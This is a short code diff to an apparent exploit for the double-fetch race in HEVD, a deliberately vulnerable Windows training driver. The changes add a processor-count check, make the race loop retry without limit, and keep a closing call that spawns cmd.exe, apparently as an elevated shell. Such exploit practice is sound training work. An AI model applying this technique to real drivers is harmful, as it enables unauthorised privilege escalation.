@@ -10,9 +10,9 @@
 
 HANDLE hHevd;
 BOOL shouldContinue = TRUE;
-INT32 counter = 1;
 
 NTSTATUS Solutions::TriggerDoubleFetch(){
+	hHevd = _hDeviceHandle;
 	UserDoubleFetch* userDoubleFetch = (UserDoubleFetch*)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE | PAGE_NOCACHE);
 	if (!userDoubleFetch) {
 		std::cout << "Could not allocate userDoubleFetch struct" << std::endl;
@@ -26,7 +26,12 @@ NTSTATUS Solutions::TriggerDoubleFetch(){
 		return STATUS_NO_MEMORY;
 	}
 
-	hHevd = _hDeviceHandle;
+	SYSTEM_INFO systemInfo = { 0 };
+	GetSystemInfo(&systemInfo);
+	if (systemInfo.dwNumberOfProcessors < 4) {
+		std::cout << "Not enough processors for the exploit" << std::endl;
+		return 0;
+	}
 
 	std::cout << "Initializing user struct..." << std::endl;
 	userDoubleFetch->buffer = buffer;
@@ -64,9 +69,7 @@ NTSTATUS Solutions::TriggerDoubleFetch(){
 		}
 
 		WaitForMultipleObjects(4, handles, true, INFINITE);
-
-		counter++;
-	} while (shouldContinue && counter < 5);
+	} while (shouldContinue);
 
 	system("cmd.exe");
 
